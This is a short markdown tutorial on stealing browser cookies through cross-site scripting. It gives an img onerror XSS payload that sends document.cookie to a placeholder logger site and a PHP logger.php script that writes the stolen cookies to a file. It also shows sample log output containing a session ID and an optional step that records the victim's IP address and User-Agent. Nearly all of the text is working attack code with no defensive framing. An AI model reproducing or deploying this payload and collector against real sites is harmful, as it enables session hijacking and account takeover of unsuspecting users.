# Logging Cookies with XSS & PHP

## XSS Payload Example
```html
<img src=x onerror="location='http://your-logger-site.com/logger.php?cookies='+document.cookie">
```

---

## Step - PHP Logger (`logger.php`)
Create a file called `logger.php` on your server:

```php
<?php
if (isset($_GET['cookies'])) {
    $log = "[" . date("Y-m-d H:i:s") . "] " . $_GET['cookies'] . PHP_EOL;
    file_put_contents('cookies.log', $log, FILE_APPEND);
}
```

### Explanation
- `$_GET['cookies']`: Captures the cookies sent via URL.
- `file_put_contents()`: Saves the cookies into a file called `cookies.log`.
- `FILE_APPEND`: Ensures new logs are added instead of overwriting the file.

---

## Example Output (`cookies.log`)
```
[2025-03-05 14:32:10] PHPSESSID=abcd1234; other_cookie=value
```

---

## Optional
You can also log **IP address** and **User-Agent** if needed:
```php
$ip = $_SERVER['REMOTE_ADDR'];
$userAgent = $_SERVER['HTTP_USER_AGENT'];
$log = "[" . date("Y-m-d H:i:s") . "] IP: $ip | UA: $userAgent | Cookies: " . $_GET['cookies'] . PHP_EOL;
```
